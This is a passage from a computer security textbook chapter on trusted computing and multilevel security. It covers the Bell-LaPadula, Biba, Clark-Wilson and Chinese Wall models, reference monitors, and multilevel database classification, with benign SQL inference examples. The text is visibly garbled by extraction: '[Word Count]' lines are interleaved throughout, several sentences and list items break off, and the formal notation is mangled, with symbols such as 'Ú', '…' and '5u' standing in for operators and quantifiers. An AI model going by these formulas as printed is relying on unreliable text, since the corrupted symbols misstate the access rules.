­control. The model relied on the access control concept described in Chapter 4 
(e.g., Figure 4.4). In the model, each subject and each object is assigned a ­security 
class. In the simplest formulation, security classes form a strict hierarchy and 
are referred to as security levels. One example is the U.S. military classification 
scheme:
[Word Count: 68]

top secret 7 secret 7 confidential 7 restricted 7 unclassified
[Word Count: 10]

It is possible to also add a set of categories or compartments to each security 
level, so that a subject must be assigned both the appropriate level and category to 
access an object. We ignore this refinement in the following discussion.
[Word Count: 41]

This concept is equally applicable in other areas, where information can be 
organized into gross levels and categories and users can be granted clearances to 
access certain categories of data. For example, the highest level of security might be 
for strategic corporate planning documents and data, accessible by only ­corporate 
officers and their staff; next might come sensitive financial and personnel data, 
accessible only by administration personnel, corporate officers, and so on. This 
­suggests a classification scheme such as
[Word Count: 79]

strategic 7 sensitive 7 confidential 7 public
[Word Count: 7]

A subject is said to have a security clearance of a given level; an object is said to 
have a security classification of a given level. The security classes control the ­manner 
by which a subject may access an object. The model defined four access modes, 
although the authors pointed out that in specific implementation environments, a 
different set of modes might be used. The modes are as follows:
[Word Count: 69]

• read: The subject is allowed only read access to the object.
 
• append: The subject is allowed only write access to the object.
[Word Count: 24]

442    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

• write: The subject is allowed both read and write access to the object.
 
• execute: The subject is allowed neither read nor write access to the object but
[Word Count: 29]

When multiple categories or levels of data are defined, the requirement is 
referred to as multilevel security (MLS). The general statement of the requirement 
for confidentiality-centered multilevel security is that a subject at a high level may 
not convey information to a subject at a lower level unless that flow accurately 
reflects the will of an authorized user as revealed by an authorized declassification. 
For implementation purposes, this requirement is in two parts and is simply stated. 
A multilevel secure system for confidentiality must enforce the following:
[Word Count: 87]

• No read up: A subject can only read an object of less or equal security level.
[Word Count: 17]

This is referred to in the literature as the simple security property (ss-property).
 
• No write down: A subject can only write into an object of greater or equal
[Word Count: 29]

­security level. This is referred to in the literature as the *-property1 ­(pronounced 
star property).
[Word Count: 15]

Figure 13.1 illustrates the need for the *-property. Here, a malicious ­subject 
passes classified information along by putting it into an information container 
labeled at a lower security classification than the information itself. This will allow a 
subsequent read access to this information by a subject at the lower clearance level.
[Word Count: 51]

These two properties provide the confidentiality form of what is known as 
mandatory access control (MAC). Under this MAC, no access is allowed that does 
not satisfy these two properties. In addition, the BLP model makes a provision for 
discretionary access control (DAC).
[Word Count: 43]

• ds-property: An individual (or role) may grant to another individual (or role)
[Word Count: 13]

access to a document based on the owner’s discretion, constrained by the MAC 
rules. Thus, a subject can exercise only accesses for which it has the necessary 
authorization and which satisfy the MAC rules.
[Word Count: 34]

The basic idea is that site policy overrides any discretionary access controls. 
That is, a user cannot give away data to unauthorized persons.
[Word Count: 23]

We use the notation presented in [BELL75]. The model is based on the concept of a 
current state of the system. The state is described by the 4-tuple (b, M, f, H), defined 
as follows:
[Word Count: 35]

• Current access set b: This is a set of triples of the form (subject, object, access-
[Word Count: 17]

mode). A triple (s, o, a) means that subject s has current access to o in access 
mode a. Note that this does not simply mean that s has the access right a to o. The 
triple means that s is currently exercising that access right; that is s is currently 
accessing o by mode a.
[Word Count: 56]

1The “*” does not stand for anything. No one could think of an appropriate name for the property ­during 
the writing of the first report on the model. The asterisk was a dummy character entered in the draft 
so that a text editor could rapidly find and replace all instances of its use once the property was named. 
No name was ever devised, and so the report was published with the “*” intact.
[Word Count: 73]

13.1 / The Bell-Lapadula Model for Computer Security   443
[Word Count: 9]

• Access matrix M: The access matrix has the structure indicated in Chapter 4.
[Word Count: 14]

The matrix element Mij records the access modes in which subject Si is ­permitted 
to access object Oj.
 
• Level function f: This function assigns a security level to each subject and
[Word Count: 32]

object. It consists of three mappings: fo(Oj) is the classification level of object 
Oj; fs(Si) is the security clearance of subject Si; fc(Si) is the current security 
level of subject Si. The security clearance of a subject is the maximum security 
level of the subject. The subject may operate at this level or at a lower level. 
Thus, a user may log onto the system at a level lower than the user’s security 
clearance. This is particularly useful in a role-based access control system.
 
• Hierarchy H: This is a directed rooted tree whose nodes correspond to objects
[Word Count: 98]

in the system. The model requires that the security level of an object must 
dominate the security level of its parent. For our discussion, we may equate 
this with the condition that the security level of an object must be greater than 
or equal to its parent.2
[Word Count: 47]

Figure 13.1  Information Flow Showing the Need for the *-Property
[Word Count: 10]

2The concept of dominance allows for a more complex security classification structure involving both secu-
rity levels and compartments. This refinement, developed in the military, is not essential for our discussion.
[Word Count: 31]

444    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

We can now define the three BLP properties more formally. For every subject 
Si and every object Oj, the requirements can be stated as follows:
[Word Count: 25]

• ss-property: Every triple of the form (Si, Oj, read) in the current access set b
[Word Count: 16]

has the property fc(Si) Ú fo(Oj).
 
• *-property: Every triple of the form (Si, Oj, append) in the current access set b
[Word Count: 22]

has the property fc(Si) … fo(Oj). Every triple of the form (Si, Oj, write) in the 
current access set b has the property fc(Si) = fo(Oj).
 
• ds-property: If (Si, Oj, Ax) is a current access (is in b), then access mode Ax
[Word Count: 43]

is recorded in the (Si, Oj) element of M. That is, (Si, Oj, Ax) implies that 
Ax ∈M[Si,Oj].
[Word Count: 18]

These three properties can be used to define a confidentiality secure system. 
In essence, a secure system is characterized by the following:
[Word Count: 22]

1.	 The current security state of the system (b, M, f, H) is secure if and only if
[Word Count: 18]

every element of b satisfies the three properties.
	
2.	 The security state of the system is changed by any operation that causes a
[Word Count: 23]

change any of the four components of the system, (b, M, f, H).
	
3.	 A secure system remains secure so long as any state change does not violate
[Word Count: 28]

[BELL75] shows how these three points can be expressed as theorems using the 
formal model. Further, given an actual design or implementation, it is ­theoretically 
possible to prove the system secure by proving that any action that affects the state 
of the system satisfies the three properties. In practice, for a ­complex system, such 
a proof has never been fully developed. However, as ­mentioned earlier, the formal 
statement of requirements can lead to a more secure design and implementation.
[Word Count: 79]

The BLP model includes a set of rules based on abstract operations that change the 
state of the system. The rules are as follows:
[Word Count: 24]

1.	 Get access: Add a triple (subject, object, access-mode) to the current access set b.
[Word Count: 15]

Used by a subject to initiate access to an object in the requested mode.
	
2.	 Release access: Remove a triple (subject, object, access-mode) from the ­current
[Word Count: 26]

access set b. Used to release previously initiated access.
[Word Count: 9]

3.	 Change object level: Change the value of fo(Oj) for some object Oj. Used by a
[Word Count: 16]

subject to alter the security level of an object.
	
4.	 Change current level: Change the value of fc(Si) for some subject Si. Used by a
[Word Count: 25]

subject to alter the security level of a subject.
	
5.	 Give access permission: Add an access mode to some entry of the access
[Word Count: 23]

­permission matrix M. Used by a subject to grant an access mode on a specified 
object to another subject.
	
6.	 Rescind access permission: Delete an access mode from some entry of M.
[Word Count: 32]

Used by a subject to revoke an access previously granted.
[Word Count: 10]

13.1 / The Bell-Lapadula Model for Computer Security   445
[Word Count: 9]

7.	 Create an object: Attach an object to the current tree structure H as a leaf.
[Word Count: 16]

Used to create a new object or activate an object that has previously been 
defined but is inactive because it has not been inserted into H.
	
8.	 Delete a group of objects: Detach from H an object and all other objects
[Word Count: 41]

beneath it in the hierarchy. This renders the group of objects inactive. This 
operation may also modify the current access set b because all accesses to the 
object are released.
[Word Count: 30]

Rules 1 and 2 alter the current access; rules 3 and 4 alter the level functions; 
rules 5 and 6 alter access permission; and rules 7 and 8 alter the hierarchy. Each rule 
is governed by the application of the three properties. For example, for get access 
for a read, we must have fc(Si) Ú fo(Oj) and Ax ∈M[Si,Oj].
[Word Count: 59]

This example illustrates the operation of the BLP model and also highlights a prac-
tical issue that must be addressed. We assume a role-based access control system. 
Carla and Dirk are users of the system. Carla is a student (s) in course c1. Dirk is a 
teacher (t) in course c1 but may also access the system as a ­student; thus two roles 
are assigned to Dirk:
[Word Count: 67]

The student role is assigned a lower security clearance and the teacher role a 
higher security clearance. Let us look at some possible actions:
[Word Count: 24]

1.	 Dirk creates a new file f1 as c1-t; Carla creates file f2 as c1-s (Figure 13.2a).
[Word Count: 17]

back. Dirk must sign in student role c1-s to create f3 so that it can be accessed 
by Carla (Figure 13.2b). In a teacher role, Dirk cannot create a file at a student 
classification level.
	
3.	 Dirk creates an exam based on an existing template file store at level c1-t.
[Word Count: 50]

Dirk must log in as c1-t to read the template and the file he creates (f4) must 
also be at the teacher level (Figure 13.2c).
	
4.	 Dirk wants Carla to take the exam and so must provide her with read access.
[Word Count: 41]

However, such access would violate the ss-property. Dirk must downgrade 
the classification of f4 from c1-t to c1-s. Dirk cannot do this in the c1-t role 
because this would violate the *-property. Therefore, a security administra-
tor (possibly Dirk in this role) must have downgrade authority and must be
[Word Count: 49]

446    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

(a) Two new ﬁles are created: f1: c1-t; f2: c1-s
[Word Count: 10]

Figure 13.2  Example of Use of BLP Concepts
[Word Count: 8]

13.1 / The Bell-Lapadula Model for Computer Security   447
[Word Count: 9]

(c) An exam is created based on an existing template: f4: c1-t
[Word Count: 12]

(d) Carla, as student, is permitted acess to the exam: f4: c1-s
[Word Count: 12]

448    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

able to perform the downgrade outside the BLP model. The dotted line in 
Figure 13.2d ­connecting f4 with c1-s-read indicates that this connection has 
not been ­generated by the default BLP rules but by a system operation.
	
5.	 Carla writes the answers to the exam into a file f5. She creates the file at
[Word Count: 54]

level c1-t so that only Dirk can read the file. This is an example of writing up, 
which is not forbidden by the BLP rules. Carla can still see her answers at her 
­workstation but cannot access f5 for reading.
[Word Count: 40]

(e) The answers given by Carla are only accessible for the teacher: f5: c1-t
[Word Count: 14]

13.1 / The Bell-Lapadula Model for Computer Security   449
[Word Count: 9]

[BELL75] outlines an implementation of MLS on the Multics operating system. We 
begin with a brief description of the relevant aspects of Multics.
[Word Count: 23]

Multics is a time-sharing operating system that was developed by a group 
at MIT known as Project MAC (multiple-access computers) in the 1960s. Multics 
was not just years but decades ahead of its time. Even by the mid-1980s, almost 
20 years after it became operational, Multics had superior security features and 
greater sophistication in the user interface and other areas than other contemporary 
­mainframe operating systems.
[Word Count: 66]

For MLS, two additional features are required. A process-level table includes 
an entry of each active process, and the entry indicates the security clearance of 
the process. Associated with each segment is a security level, which is stored in the 
­parent directory segment of the segment in question.
[Word Count: 48]

Corresponding to the security state of the BLP model (b, M, f, H) is a set of 
Multics data structures (Figure 13.3). The correspondence is as follows:
[Word Count: 27]

b:	 Segment descriptor word. The descriptor segment identifies the subject
[Word Count: 10]

(process). The segment pointer in segment descriptor word identifies 
the object (data segment). The three access control bits in the segment 
descriptor word identify the access mode.
M:	 Access control list.
f:	
Information in the directory segment and in the process-level table.
H:	 Hierarchical segment structure.
[Word Count: 46]

With these data structures, Multics can enforce discretionary and mandatory 
access control. When a process attempts an access to a segment, it must have the 
desired access permission as specified by the access control list. Also, its security 
clearance is compared to the security classification of the segment to be accessed to 
determine if the simple security rule and *-property security rule are satisfied.
[Word Count: 64]

450    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

While the BLP model could in theory lay the foundations for secure computing within 
a single administration realm environment, there are some important ­limitations to 
its usability and difficulties to its implementation.
[Word Count: 32]

First, there is the incompatibility of confidentiality and integrity within a ­single 
MLS system. In general terms, MLS can work either for powers or for secrets, but not 
readily for both. This mutual exclusion excludes some interesting power and integrity 
centered technologies from being used effectively in BLP style MLS environments.
[Word Count: 51]

A second important limitations to usability is the so called cooperating ­conspirator 
problem in the presence of covert channels. In the presence of shared resources the 
*-property may become unenforceable. This is especially a problem in the presence 
of active content that is prevalent in current word processing and other document 
formats. A malicious document could carry in it a subject that would when executed 
broadcast classified documents using shared-resource covert channels. In essence, the 
BLP model effectively breaks down when (untrusted) low classified executable data 
are allowed to be executed by a high clearance (trusted) subject.
[Word Count: 97]

13.2	Other Formal Models for Computer Security
[Word Count: 7]

It is important to note that the models described in this chapter either focus on 
confidentiality or on integrity, with the exception of the Chinese Wall Model. The 
incompatibility of confidentiality and integrity concerns is recognized to be a major 
limitation to the usability of MLS in general, and to confidentiality focused MLS in 
specific.
[Word Count: 55]

This section explores some other important computer security models.
[Word Count: 9]

Figure 13.3  Multics Data Structures for MLS
[Word Count: 7]

13.2 / Other Formal Models for Computer Security   451
[Word Count: 9]

The BLP model deals with confidentiality and is concerned with unauthorized 
­disclosure of information. The Biba [BIBA77] models deals with integrity and is con-
cerned with the unauthorized modification of data. The Biba model is intended to 
deal with the case in which there is data that must be visible to users at multiple or all 
security levels but should only be modified in controlled ways by authorized agents.
[Word Count: 69]

The basic elements of the Biba model have the same structure as the BLP 
model. As with BLP, the Biba model deals with subjects and objects. Each subject 
and object is assigned an integrity level, denoted as I(S) and I(O) for subject S and 
object O, respectively. A simple hierarchical classification can be used, in which there 
is a strict ordering of levels from lowest to highest. As in the BLP model, it is also 
possible to add a set of categories to the classification scheme; this we ignore here.
[Word Count: 90]

The model considers the following access modes:
[Word Count: 7]

• Modify: To write or update information in an object.
 
• Observe: To read information in an object.
 
• Execute: To execute an object.
 
• Invoke: Communication from one subject to another.
[Word Count: 32]

The first three modes are analogous to BLP access modes. The invoke mode is 
new. Biba then proposes a number of alternative policies that can be imposed on this 
model. The most relevant is the strict integrity policy, based on the following rules:
[Word Count: 43]

• Simple integrity: A subject can modify an object only if the integrity level of
[Word Count: 15]

the subject dominates the integrity level of the object: I(S) Ú I(O).
 
• Integrity confinement: A subject can read an object only if the integrity level
[Word Count: 26]

of the subject is dominated by the integrity level of the object: I(S) … I(O).
 
• Invocation property: A subject can invoke another subject only if the integrity
[Word Count: 28]

level of the first subject dominates the integrity level of the second subject: 
I(S1) Ú I(S2).
[Word Count: 16]

The first two rules are analogous to those of the BLP model but are concerned 
with integrity and reverse the significance of read and write. The simple integrity rule 
is the logical write-up restriction that prevents contamination of high-integrity data. 
Figure 13.4 illustrates the need for the integrity confinement rule. A low-integrity
[Word Count: 52]

Figure 13.4  Contamination with Simple Integrity Controls
Source: [GASS88].
[Word Count: 9]

452    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

­process may read low-integrity data but is prevented from contaminating a high-
integrity file with that data by the simple integrity rule. If only this rule is in force, a 
high-integrity process could conceivably copy low-integrity data into a high-integrity 
file. Normally, one would trust a high-integrity process to not contaminate a high-
integrity file, but either an error in the process code or a Trojan horse could result in 
such contamination; hence the need for the integrity confinement rule.
[Word Count: 80]

A more elaborate and perhaps more practical integrity model was proposed by Clark 
and Wilson [CLAR87]. The Clark-Wilson integrity model (CWM) is aimed at 
­commercial rather than military applications and closely models real commercial 
operations. The model is based on two concepts that are traditionally used to enforce 
commercial security policies:
[Word Count: 51]

• Well-formed transactions: A user should not manipulate data arbitrarily, but
[Word Count: 11]

only in constrained ways that preserve or ensure the integrity of the data.
 
• Separation of duty among users: Any person permitted to create or certify a
[Word Count: 27]

well-formed transaction may not be permitted to execute it (at least against 
production data).
[Word Count: 14]

The model imposes integrity controls on data and the transactions that 
­manipulate the data. The principal components of the model are as follows:
[Word Count: 23]

• Constrained data items (CDIs): Subject to strict integrity controls.
 
• Unconstrained data items (UDIs): Unchecked data items. An example is a
[Word Count: 22]

simple text file.
 
• Integrity verification procedures (IVPs): Intended to assure that all CDIs
[Word Count: 14]

­conform to some application-specific model of integrity and consistency.
 
• Transformation procedures (TPs): System transactions that change the set of
[Word Count: 20]

CDIs from one consistent state to another.
[Word Count: 7]

The CWM enforces integrity by means of certification and enforcement rules 
on TPs. Certification rules are security policy restrictions on the behavior of IVPs 
and TPs. Enforcement rules are built-in system security mechanisms that achieve 
the objectives of the certification rules. The rules are as follows:
[Word Count: 46]

Cl:	 All IVPs must properly ensure that all CDIs are in a valid state at the time
[Word Count: 17]

C2:	 All TPs must be certified to be valid. That is, they must take a CDI to a valid
[Word Count: 19]

final state, given that it is in a valid state to begin with. For each TP, and 
each set of CDIs that it may manipulate, the security officer must specify a 
relation, which defines that execution. A relation is thus of the form (TPi, 
(CDIa, CDIb, CDIc . . . )), where the list of CDIs defines a ­particular set of 
arguments for which the TP has been certified.
El:	 The system must maintain the list of relations specified in rule C2 and
[Word Count: 83]

must ensure that the only manipulation of any CDI is by a TP, where the 
TP is operating on the CDI as specified in some relation.
[Word Count: 26]

13.2 / Other Formal Models for Computer Security   453
[Word Count: 9]

E2:	 The system must maintain a list of relations of the form (UserID, TPi,
[Word Count: 14]

(CDIa, CDIb, CDIc, . . . )), which relates a user, a TP, and the data objects 
that TP may reference on behalf of that user. It must ensure that only 
executions described in one of the relations are performed.
C3:	 The list of relations in E2 must be certified to meet the separation of duty
[Word Count: 56]

requirement.
E3:	 The system must authenticate the identity of each user attempting to
[Word Count: 13]

­execute a TP.
C4:	 All TPs must be certified to write to an append-only CDI (the log) all infor-
[Word Count: 19]

mation necessary to permit the nature of the operation to be ­reconstructed.
C5:	 Any TP that takes a UDI as an input value must be certified to perform
[Word Count: 28]

only valid transformations, or else no transformations, for any possible 
value of the UDI. The transformation should take the input from a UDI 
to a CDI, or the UDI is rejected. Typically, this is an edit program.
E4:	 Only the agent permitted to certify entities may change the list of such
[Word Count: 51]

entities associated with other entities: specifically, the list of TPs associated 
with a CDI and the list of users associated with a TP. An agent that can 
certify an entity may not have any execute rights with respect to that entity.
[Word Count: 41]

Figure 13.5 illustrates the rules. The rules combine to form a two-part integrity 
assurance facility, in which certification is done by a security officer with respect to 
an integrity policy, and enforcement is done by the system.
[Word Count: 37]

CDI = constrained data item
IVP = integrity veriﬁcation procedure
TP = transformation procedure
UDI = unconstrained data item
[Word Count: 19]

E2: Users authenticated for TP
C3: Suitable separation of duty
[Word Count: 10]

E4: Authorization
lists changed only
by security ofﬁcer
[Word Count: 8]

Figure 13.5  Summary of Clark-Wilson System Integrity Rules
Source: [CLAR87].
[Word Count: 10]

454    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

The Chinese Wall Model (CWM) takes a quite different approach to specifying 
integrity and confidentiality than any of the approaches we have examined so far. 
The model was developed for commercial applications in which conflicts of ­interest 
can arise. The model makes use of both discretionary and mandatory access ­concepts.
[Word Count: 50]

The elements of the model are the following:
[Word Count: 8]

• Subjects: Active entities that may wish to access protected objects; includes
[Word Count: 12]

users and processes.
 
• Information: Corporate information organized into a hierarchy with three levels:
	
	 — Objects: Individual items of information, each concerning a single
[Word Count: 24]

­corporation.
	
	 — Dataset (DS): All objects that concern the same corporation.
	
	 — Conflict of interest (CI) class: All datasets whose corporations are in
[Word Count: 23]

competition.
 
• Access rules: Rules for read and write access.
[Word Count: 10]

Figure 13.6a gives an example. There are datasets representing banks, oil 
­companies, and gas companies. All bank datasets are in one CI, all oil company 
datasets in another CI, and so forth.
[Word Count: 32]

To enforce the Chinese wall policy, two rules are needed. To indicate the simi-
larity with the two BLP rules, the authors gave them the same names. The first rule 
is the simple security rule:
[Word Count: 35]

Simple security rule: A subject S can read on object O only if
 
• O is in the same DS as an object already accessed by S, OR
 
• O belongs to a CI from which S has not yet accessed any information.
[Word Count: 43]

13.2 / Other Formal Models for Computer Security   455
[Word Count: 9]

*-property rule: A subject S can write an object O only if
 
• S can read O according to the simple security rule, AND
 
• All objects that S can read are in the same DS as O.
[Word Count: 38]

Put another way, either subject cannot write at all, or a subject’s access (both 
read and write) is limited to a single dataset. Thus, in Figure 13.6, neither John nor 
Jane has write access to any objects in the overall universe of data.
[Word Count: 43]

(b) John has access to Bank A and Oil A
(c) Jane has access to Bank A and Oil B
[Word Count: 20]

Figure 13.6  Potential Flow of Information between Two CIs
[Word Count: 9]

456    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

The *-property rule is quite restrictive. However, in many cases, a user only 
needs read access because the user is performing some analysis role.
[Word Count: 24]

To somewhat ease the write restriction, the model includes the concept 
of ­sanitized data. In essence, sanitized data are data that may be derived from 
­corporate data but that cannot be used to discover the corporation’s identity. Any 
DS consisting solely of sanitized data need not be protected by a wall; thus the two 
CWM rules do not apply to such DSs.
[Word Count: 62]

Some useful terminology related to trusted systems is listed in Table 13.1.
[Word Count: 12]

Table 13.1  Terminology Related to Trust
[Word Count: 6]

Trust
The extent to which someone who relies on a system can have confidence that the system meets its 
specifications (i.e., that the system does what it claims to do and does not perform
unwanted functions).
[Word Count: 36]

13.3 / The Concept of Trusted Systems   457
[Word Count: 8]

• Complete mediation: The security rules are enforced on every access, not just,
[Word Count: 13]

for example, when a file is opened.
 
• Isolation: The reference monitor and database are protected from unauthorized
[Word Count: 18]

modification.
 
• Verifiability: The reference monitor’s correctness must be provable. That
[Word Count: 11]

is, it must be possible to demonstrate mathematically that the reference 
­monitor enforces the security rules and provides complete mediation and 
isolation.
[Word Count: 22]

These are stiff requirements. The requirement for complete mediation means 
that every access to data within main memory and on disk and tape must be ­mediated. 
Pure software implementations impose too high a performance penalty to be ­practical;
[Word Count: 38]

458    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

the solution must be at least partly in hardware. The requirement for isolation means 
that it must not be possible for an attacker, no matter how clever, to change the logic 
of the reference monitor or the contents of the security kernel database. Finally, the 
requirement for mathematical proof is formidable for something as complex as a 
­general-purpose computer. A system that can provide such verification is referred to 
as a trustworthy system.
[Word Count: 73]

A final element illustrated in Figure 13.7 is an audit file. Important security 
events, such as detected security violations and authorized changes to the security 
kernel database, are stored in the audit file.
[Word Count: 33]

Now consider the use of a secure operating system in this scenario (Figure 13.8c). 
Security levels are assigned to subjects at logon on the basis of criteria such as the 
­terminal from which the computer is being accessed and the user involved, as identi-
fied by password/ID. In this example, there are two security levels, sensitive and public, 
ordered so that sensitive is higher than public. Processes owned by Bob and Bob’s data 
file are assigned the security level sensitive. Alice’s file and processes are restricted to 
public. If Bob invokes the Trojan horse program (Figure 13.8d), that ­program acquires
[Word Count: 100]

13.4 / Application of Multilevel Security   459
[Word Count: 7]

Bob’s security level. It is therefore able, under the simple security property, to observe 
the sensitive character string. When the program attempts to store the string in a 
­public file (the back-pocket file), however, the *-property is violated and the attempt 
is ­disallowed by the reference monitor. Thus, the attempt to write into the back-pocket 
file is denied even though the access control list permits it: The security policy takes 
precedence over the access control list mechanism.
[Word Count: 77]

RFC 4949 defines multilevel security as follows:
[Word Count: 7]

Figure 13.8  Trojan Horse and Secure Operating System
[Word Count: 8]

Multilevel Security (MLS): A mode of system operation wherein (a) two or more 
security levels of information are allowed to be to be handled concurrently within 
the same system when some users having access to the system have neither a secu-
rity clearance nor need-to-know for some of the data handled by the system and 
(b) separation of the users and the classified material on the basis, respectively, 
of clearance and classification level are dependent on operating system control.
[Word Count: 79]

460    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

Multilevel security is of interest when there is a requirement to maintain 
a resource, such as a file system or database in which multiple levels of data 
­sensitivity are defined. The hierarchy could be as simple as two levels (e.g., pub-
lic and ­proprietary) or could have many levels (e.g., the military unclassified, 
restricted, confidential, secret, top secret). The preceding three sections have 
introduced us to the essential elements of multilevel security. In this section, we 
look at two ­applications areas where MLS concepts have been applied: role-based 
access control system and database security.
[Word Count: 94]

Multilevel Security for Role-Based Access Control3
[Word Count: 6]

[OSBO00] shows how a rule-based access control (RBAC) system can be used to 
implement the BLP multilevel security rules. Recall that the ANSI standard RBAC 
specification included the concept of administrative functions, which ­provide 
the capability to create, delete, and maintain RBAC elements and relations. It is 
useful here to assign special administrative roles to these functions. With this in 
mind, Table 13.2 summarizes the components of an RBAC.
[Word Count: 69]

The following formal specification indicates how a RBAC system can be used 
to implement MLS access:
[Word Count: 16]

• Constraint on users: For each user u in the set of users U, a security clearance
[Word Count: 17]

L(u) is assigned. Formally, 5u ∈ U [L(u) is given].
 
• Constraints on permissions: Each permission assigns a read or write per­mission
[Word Count: 22]

to an object o, and each object has one read and one write permission. All
[Word Count: 15]

3The reader may wish to review Section 4.5 before proceeding.
[Word Count: 10]

R and AR, disjoint sets of (regular) roles and administrative roles
[Word Count: 11]

P and AP, disjoint sets of (regular) permissions and administrative permissions
[Word Count: 11]

PA ⊆P * R, a many-to-many permission to role assignment relation
APA ⊆AP * AR, a many-to-many permission to administrative role assignment relation
[Word Count: 23]

UA ⊆U * R, a many-to-many user to role assignment relation
AUA ⊆U * AR, a many-to-many user to administrative role assignment relation
[Word Count: 23]

RH ⊆R * R, a partially ordered role hierarchy
ARH ⊆AR * AR, partially ordered administrative role hierarchy
(both hierarchies are written as Ú in infix notation)
[Word Count: 27]

User: S S U, a function mapping each session si to the single user user(si) (constant for the session’s 
lifetime)
[Word Count: 20]

Roles: S S 2RUAR maps each session si to a set of roles and administrative roles
[Word Count: 16]

Roles: (Si ⊆{ r   E r′ Ú r) [(user (si),r′) ∈U A h AU A]} (which can change with time) ­sessions si 
has the permissions  hr∈ roles(si) {p  (Er″… r) ∈PAhAPA]}
[Word Count: 31]

There is a collection of constraints stipulating which values of the various components ­enumerated 
above are allowed or forbidden.
[Word Count: 19]

13.4 / Application of Multilevel Security   461
[Word Count: 7]

objects have a security classification. Formally, P = {(o,r),(o,w)| o is an object 
in the system}; 5o ∈P[L(o) is given].
 
• Definitions: The read-level of a role r, denoted r-level(r), is the least upper
[Word Count: 34]

bound of the security levels of the objects for which (o, r) is in the permis-
sions of r. The w-level of a role r (denoted w-level(r)) is the greatest lower 
bound (glb) of the security levels of the objects o for which (o, w) is in the 
permissions of r, if such a glb exists. If the glb does not exist, the w-level is 
undefined.
 
• Constraints on UA: Each role r has a defined write-level, denoted
[Word Count: 78]

w-level(r). For each user assignment, the clearance of the user must domi-
nate the r-level of the role and be dominated by the w-level of the role. 
Formally, 5r ∈UA [w-level(r) is defined]; 5(u,r) ∈UA [L(u) Ú r-level(r)]; 
5(u,r) ∈UA [L(u) … w-level(r)].
[Word Count: 43]

Database Security and Multilevel Security
[Word Count: 5]

The addition of multilevel security to a database system increases the complexity of 
the access control function and of the design of the database itself. One key issue 
is the granularity of classification. The following are possible methods of imposing 
­multilevel security on a relational database, in terms of the granularity of ­classification 
(Figure 13.9):
[Word Count: 55]

• Entire database: This simple approach is easily accomplished on an MLS
[Word Count: 12]

platform. An entire database, such as a financial or personnel database, 
could be classified as confidential or restricted and maintained on a server 
with other files.
 
• Individual tables (relations): For some applications, it is appropriate to assign
[Word Count: 38]

classification at the table level. In the example of Figure 13.9a, two levels of 
classification are defined: unrestricted (U) and restricted (R). The Employee 
table contains sensitive salary information and is classified restricted, while 
the Department table is unrestricted. This level of granularity is relatively easy 
to implement and enforce.
 
• Individual columns (attributes): A security administrator may choose to
[Word Count: 60]

determine classification on the basis of attributes, so that selected columns 
are classified. In the example of Figure 13.9b, the administrator determines 
that salary information and the identity of department managers is restricted 
information.
 
• Individual rows (tuples): In other circumstances, it may make sense to assign
[Word Count: 47]

classification levels on the basis of individual rows that match certain properties.
[Word Count: 12]

462    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

Figure 13.9  Approaches to Database Classification
[Word Count: 6]

13.4 / Application of Multilevel Security   463
[Word Count: 7]

In the example of Figure 13.9c, all rows in the Department table that contain 
information relating to the Accounts Department (Dept. ID = 4), and all rows 
in the Employee table for which the Salary is greater than 50K are restricted.
 
• Individual elements: The most difficult scheme to implement and manage is
[Word Count: 53]

one in which individual elements may be selectively classified. In the exam-
ple of Figure 13.9d, salary information and the identity of the manager of the 
Accounts Department are restricted.
[Word Count: 30]

The granularity of the classification scheme affects the way in which access 
control is enforced. In particular, efforts to prevent inference depend on the 
­granularity of the classification.
[Word Count: 28]

Read Access  For read access, a database system needs to enforce the simple 
security rule (no read up). This is straightforward if the classification granularity 
is the entire database or at the table level. Consider now a database classified by 
column (attribute). For example, in Figure 13.9b, suppose that a user with only 
unrestricted clearance issues the following SQL query:
[Word Count: 60]

SELECT Ename
	
FROM Employee
	
WHERE Salary > 50K
[Word Count: 8]

This query returns only unrestricted data but reveals restricted information, namely 
whether any employees have a salary greater than 50K and, if so, which employees. 
This type of security violation can be addressed by considering not only the data 
returned to the user but also any data that must be accessed to satisfy the query. 
In this case, the query requires access to the Salary attribute, which is unauthorized 
for this user; therefore, the query is rejected.
[Word Count: 77]

If classification is by row (tuple) rather than column, then the preceding query 
does not pose an inference problem. Figure 13.9c shows that in the Employee table, 
all rows corresponding to salaries greater than 50K are restricted. Because all such 
records will be removed from the response to the preceding query, the inference 
just discussed cannot occur. However, some information may be inferred, because a 
null response indicates either that salaries above 50 are restricted, or no employee 
has a salary greater than 50K.
[Word Count: 84]

The use of classification by rows instead of columns creates other inference 
problems. For example, suppose we add a new Projects table to the database of 
Figure13.9c consisting of attributes Eid, ProjectID, and ProjectName, where the 
Eid field in the Employee and Projects tables can be joined. Suppose that all records 
in the Projects table are unrestricted except for projects with ProjectID 500 through 
599. Consider the following request:
[Word Count: 69]

SELECT Ename
	
WHERE Employee.Eid = Projects.Eid
	
AND Projects.ProjectID = 500
[Word Count: 10]

464    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

This request, if granted, returns information from the Employee table, which is 
unrestricted, although it reveals restricted information, namely that the selected 
employees are assigned to project 500. As before, the database system must ­consider 
not just the data returned to the user but any data that must be accessed to satisfy 
the query.
[Word Count: 54]

Classification by element does not introduce any new considerations. The 
­system must prevent not only a read up but also a query that must access higher-
level elements in order to satisfy the query.
[Word Count: 34]

As a general comment, we can say that dealing with read access is far ­simpler 
if the classification granularity is database or table. If the entire database has a 
­single classification, then no new inference issues are raised. The same is true of 
classification by table. If some finer-grained classification seems desirable, it might 
be possible to achieve the same effect by splitting tables.
[Word Count: 64]

Write Access  For write access, a database system needs to enforce the *-security 
rule (no write down). But this is not as simple as it may seem. Consider the following 
situation. Suppose the classification granularity is finer than the table level (i.e., by 
column, by row, or by element) and that a user with a low clearance (unrestricted) 
requests the insertion of a row with the same primary key as an existing row where 
the row or one of its elements is at a higher level. The DBMS has essentially three 
choices:
[Word Count: 92]

1.	 Notify the user that a row with the same primary key already exists and reject
[Word Count: 16]

the insertions. This is undesirable because it informs the user of the existence 
